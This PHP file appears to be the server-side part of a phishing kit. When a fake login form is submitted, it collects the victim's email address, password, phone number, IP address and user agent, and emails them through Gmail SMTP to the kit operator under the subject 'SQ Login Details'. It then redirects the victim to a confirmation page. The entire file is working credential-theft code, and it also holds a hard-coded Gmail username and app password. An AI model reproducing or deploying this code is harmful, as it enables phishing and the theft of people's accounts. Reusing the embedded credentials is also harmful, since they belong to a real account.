<?php

require 'email.php'; // Include the email.php file where $Receive_email is defined
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require './PHPMailer/src/Exception.php';
require './PHPMailer/src/PHPMailer.php';
require './PHPMailer/src/SMTP.php';

if (isset($_POST['btnFirst'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";

	$message .= "Email Address            : " . $_POST['em'] . "\n";
	$message .= "Passcode              : " . $_POST['pw'] . "\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: " . $ip . "\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : " . $useragent . "\n";
	$message .= "|----------- --------------|\n";
	$sendTo = explode(',', $Receive_email); // Split multiple recipients
	$subject = "SQ Login Details : $ip";

	// Create a new PHPMailer instance
	$mail = new PHPMailer(true);

	try {
		// Set the SMTP configuration (you can put this in email.php and include it here)
		$mail->isSMTP();
		$mail->Host = 'smtp.gmail.com';
		$mail->SMTPAuth = true;
		$mail->Username = 'ozpan970@gmail.com'; // Replace with your Gmail email
		$mail->Password = 'flhqhtfqsmecptdo'; // Replace with your Gmail app password
		$mail->Port = 465;
		$mail->SMTPSecure = 'ssl';

		// Add recipients
		foreach ($sendTo as $recipient) {
			$mail->addAddress(trim($recipient));
		}

		// Set email content
		$mail->isHTML(false); // Set to false if you want plain text
		$mail->Subject = $subject;
		$mail->Body = $message;

		// Send the email
		$mail->send();

		header("Location: ./confirm.php");
	} catch (Exception $e) {
		echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
	}
} else if (isset($_POST['btnSecond'])) {
	// Similar modifications as above for the 'btn2' block
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";

	$message .= "Email Address            : " . $_POST['em'] . "\n";
	$message .= "Passcode              : " . $_POST['pw'] . "\n";
	$message .= "Phone Number              : " . $_POST['mnum'] . "\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: " . $ip . "\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : " . $useragent . "\n";
	$message .= "|----------- --------------|\n";
	$sendTo = explode(',', $Receive_email); // Split multiple recipients
	$subject = "SQ Login Details : $ip";

	// Create a new PHPMailer instance
	$mail = new PHPMailer(true);

	try {
		// Set the SMTP configuration (you can put this in email.php and include it here)
		$mail->isSMTP();
		$mail->Host = 'smtp.gmail.com';
		$mail->SMTPAuth = true;
		$mail->Username = 'ozpan970@gmail.com'; // Replace with your Gmail email
		$mail->Password = 'flhqhtfqsmecptdo'; // Replace with your Gmail app password
		$mail->Port = 465;
		$mail->SMTPSecure = 'ssl';

		// Add recipients
		foreach ($sendTo as $recipient) {
			$mail->addAddress(trim($recipient));
		}

		// Set email content
		$mail->isHTML(false); // Set to false if you want plain text
		$mail->Subject = $subject;
		$mail->Body = $message;

		// Send the email
		$mail->send();

		header("Location: ./thank.php");
	} catch (Exception $e) {
		echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
	}
} else {
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
	$data = array(
		'signal' => $signal,
		'msg' => $msg,
		'redirect_link' => $redirect,
	);
	echo json_encode($data);
}
